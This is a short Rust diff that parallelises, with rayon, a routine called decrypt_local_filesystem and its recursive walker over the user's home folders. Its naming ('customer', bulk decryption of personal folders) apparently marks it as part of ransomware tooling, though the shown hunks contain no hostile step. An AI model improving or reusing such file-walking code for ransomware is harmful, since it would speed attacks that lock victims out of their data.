@@ -1,3 +1,4 @@
+use rayon::prelude::*;
 use reqwest::blocking::Client;
 use std::{collections, fs, io, path};
 
@@ -15,21 +16,21 @@ fn decrypt_local_filesystem(customer: &crypto::Customer) {
         "Pictures",
         "Music",
     ];
-    for folder in folders {
+    folders.par_iter().for_each(|folder| {
         walk_dir(
             path::Path::new(&format!(
                 "{}\\{}",
                 &dirs::home_dir().unwrap().display(),
-                folder
+                *folder
             )),
             customer,
         );
-    }
+    });
 }
 
 fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
     if let Ok(contents) = fs::read_dir(path) {
-        for entry in contents {
+        contents.par_bridge().into_par_iter().for_each(|entry| {
             let entry = entry.unwrap();
             match filesystem::check_dir_entry(&entry.path()) {
                 0 => {
@@ -40,7 +41,7 @@ fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
                 }
                 _ => (),
             }
-        }
+        });
     }
 }
 
